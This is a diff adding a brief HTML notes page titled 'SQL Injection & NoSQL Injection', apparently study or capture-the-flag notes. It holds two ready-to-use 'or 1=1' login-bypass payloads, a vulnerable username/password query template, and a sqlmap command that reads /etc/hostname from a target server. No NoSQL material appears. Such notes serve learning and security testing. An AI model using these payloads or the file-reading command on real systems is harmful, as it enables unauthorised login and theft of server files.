@@ -1,0 +1,29 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>SQL Injection &amp; NoSQL Injection</title>
+</head><body><div style="text-align: left"><span style="font-size: 16pt"><span style="font-family: -apple-system"><br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+</span></span></div><div style="text-align: left"><span style="font-size: 16pt"><span style="font-family: -apple-system">0xdf’ or 1=1;–</span></span></div>&nbsp;<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<div style="text-align: left"><span style="font-size: 14pt"><span style="font-family: SFMono-Regular"><b>select username from users where username = '[input user]' and password = '[input password]';</b></span></span></div><br/>
+<br/>
+<br/>
+something' or 1=1;-- -<br/>
+<br/>
+<br/>
+<b>sqlmap<br/>
+<br/>
+</b>sqlmap -r login.req --batch --threads 10 --file-read=/etc/hostname<br/>
+<br/>
+</body></html>
